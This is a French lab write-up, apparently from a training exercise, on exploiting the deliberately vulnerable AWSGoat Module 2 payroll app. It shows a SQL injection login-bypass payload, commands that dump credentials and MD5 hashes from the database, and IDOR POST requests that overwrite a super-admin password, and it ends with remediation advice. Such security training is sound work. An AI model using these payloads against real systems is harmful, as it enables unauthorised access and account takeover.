# Rapport méthodologique — AWSGoat Module 2

**Analyste :** Jean
**Cible :** AWSGoat Module 2 (application HR Payroll — conteneur `awsgoat-m2-web`)
**Date :** 24 juillet 2026

---

## Contexte

Analyse du fichier `payslips.php` de l'application admin AWSGoat M2, révélant une chaîne d'exploitation complète : bypass d'authentification par injection SQL, suivi d'une élévation de privilèges par IDOR menant à une prise de contrôle de compte (account takeover) sur le compte super-admin.

---

## 1. Reconnaissance initiale — Lecture du code source

```
docker exec -it awsgoat-m2-web cat /var/www/html/admin/payslips.php
```

**Constat :** Le paramètre `uid`, utilisé dans les requêtes UPDATE de mise à jour de profil, provient de `$_REQUEST['uid']` et n'est jamais comparé à `$_SESSION['id']`. Absence de contrôle d'autorisation applicative (broken access control).

---

## 2. Identification des conteneurs de l'environnement

```
docker ps
```

**Constat :** Base de données séparée dans le conteneur `awsgoat-m2-db` (MySQL 8.0).

---

## 3. Récupération des identifiants de connexion base de données

```
docker exec -it awsgoat-m2-web cat /var/www/html/config.inc
```

---

## 4. Énumération des comptes utilisateurs

```
docker exec -it awsgoat-m2-db mysql -u root -p appdb -e "SELECT id, username, isadmin FROM users;"
```

**Constat :** Hiérarchie de privilèges identifiée — `isadmin=2` (super-admin), `isadmin=1` (admin RH), `isadmin=0` (utilisateur standard).

---

## 5. Extraction des hashs de mots de passe (tentative)

```
docker exec -it awsgoat-m2-db mysql -u root -p appdb -e "SELECT id, username, password FROM users WHERE id IN (2,3);"
```

**Constat :** Hashs MD5 non salés (cohérent avec `md5($password)` observé dans le code applicatif).

---

## 6. Tentative de cassage par dictionnaire (piste abandonnée)

Tentative de cassage MD5 via CrackStation puis via script Python avec dictionnaire rockyou.txt.

**Résultat :** Aucune correspondance. Piste abandonnée au profit d'une vulnérabilité plus directe identifiée dans `login.php`.

---

## 7. Analyse du mécanisme d'authentification

```
docker exec -it awsgoat-m2-web cat /var/www/html/login.php
```

**Constat :** Requête SQL de login construite par concaténation directe du paramètre `email`, sans échappement ni requête préparée — injection SQL confirmée sur le formulaire de connexion.

---

## 8. Récupération de l'email cible pour le bypass

```
docker exec -it awsgoat-m2-db mysql -u root -p appdb -e "SELECT id, username, email FROM users WHERE id IN (2,3);"
```

---

## 9. Bypass d'authentification par injection SQL

Payload injecté dans le champ **email** du formulaire de login :

```
terry@inefinextech.com' -- -
```

**Résultat :** Authentification réussie en tant que Terry (id=2, isadmin=1) sans connaissance du mot de passe. La clause `-- -` commente la vérification du mot de passe dans la requête SQL.

---

## 10. Interception de la requête de mise à jour de profil légitime

Capture via DevTools navigateur (onglet Network) de la requête POST vers `admin-index.php` déclenchée par le formulaire Settings, afin d'identifier la structure du paramètre `uid` et les champs du formulaire.

---

## 11. Exploitation de l'IDOR — modification d'un compte tiers

```
Invoke-WebRequest -Uri "http://localhost/admin/admin-index.php" -Method POST -UseBasicParsing -Headers @{Cookie="PHPSESSID=<session_terry>"} -Body @{uid="1";inputfirstname="Terry";inputlastname="IDORTEST";inputphone="";inputEmail="terry@inefinextech.com";inputAddress="<adresse_terry>";inputssn="<ssn_terry>";inputbank="";inputnewPassword="";inputcnfPassword="";submit=""}
```

**Résultat :** Requête envoyée avec la session de Terry (isadmin=1) mais un `uid=1` ciblant le compte de chris (isadmin=2, super-admin).

---

## 12. Vérification en base de l'IDOR

```
docker exec -it awsgoat-m2-db mysql -u root -p appdb -e "SELECT id, first_name, last_name FROM users_info WHERE id=1;"
```

**Résultat :** Confirmation — le compte id=1 (chris) a été modifié par un utilisateur non autorisé (Terry). IDOR validé : un admin de niveau isadmin=1 peut altérer les données d'un compte isadmin=2.

---

## 13. Escalade vers account takeover — prise de contrôle du mot de passe

```
Invoke-WebRequest -Uri "http://localhost/admin/admin-index.php" -Method POST -UseBasicParsing -Headers @{Cookie="PHPSESSID=<session_terry>"} -Body @{uid="1";inputfirstname="Terry";inputlastname="IDORTEST";inputphone="";inputEmail="terry@inefinextech.com";inputAddress="<adresse_terry>";inputssn="<ssn_terry>";inputbank="";inputnewPassword="<nouveau_mdp>";inputcnfPassword="<nouveau_mdp>";submit=""}
```

---

## 14. Vérification finale — confirmation du takeover

```
docker exec -it awsgoat-m2-db mysql -u root -p appdb -e "SELECT id, username, password FROM users WHERE id=1;"
```

**Résultat :** Hash MD5 du compte chris modifié, correspondant au nouveau mot de passe injecté. Prise de contrôle complète du compte super-admin confirmée.

---

## Synthèse de la chaîne d'exploitation

| Étape | Vulnérabilité | Impact |
|---|---|---|
| 1 | Injection SQL — `login.php` (champ email, requête non préparée) | Bypass d'authentification |
| 2 | IDOR — `admin-index.php`/`payslips.php` (paramètre `uid` non vérifié vs. session) | Élévation de privilèges horizontale/verticale |
| 3 | Absence de contrôle sur le changement de mot de passe via le même IDOR | Account takeover total |

**Chemin d'attaque résumé :** authentification bypassée par SQLi → accès admin de niveau intermédiaire → exploitation de l'IDOR pour cibler un compte de privilège supérieur → écrasement du mot de passe → prise de contrôle totale du compte super-admin, sans authentification légitime à aucune étape.

## Recommandations

- Requêtes préparées (paramétrées) sur tous les points d'entrée SQL, notamment `login.php`.
- Vérification systématique de l'appartenance de la ressource à l'utilisateur courant (`$_SESSION['id']` vs. `uid` reçu) avant toute opération UPDATE.
- Contrôle d'accès basé sur les rôles (RBAC) empêchant un `isadmin=1` d'agir sur un `isadmin=2`.
- Hachage des mots de passe avec un algorithme adapté (bcrypt/argon2) et sel, en remplacement de MD5 non salé.

---

*Fin du rapport — session AWSGoat Module 2.*
